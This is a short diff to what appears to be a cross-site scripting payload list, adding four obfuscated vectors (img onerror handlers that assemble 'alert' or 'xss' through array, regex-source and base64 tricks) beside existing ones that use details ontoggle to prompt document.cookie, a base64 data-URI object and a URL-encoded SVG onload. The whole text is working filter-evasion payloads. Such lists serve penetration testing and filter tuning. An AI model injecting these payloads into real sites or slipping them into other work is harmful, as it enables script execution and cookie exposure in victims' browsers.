@@ -1,3 +1,7 @@
+<img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
+<img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
+parent[/al/.source.concat(/ert/.source)](2)
+<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
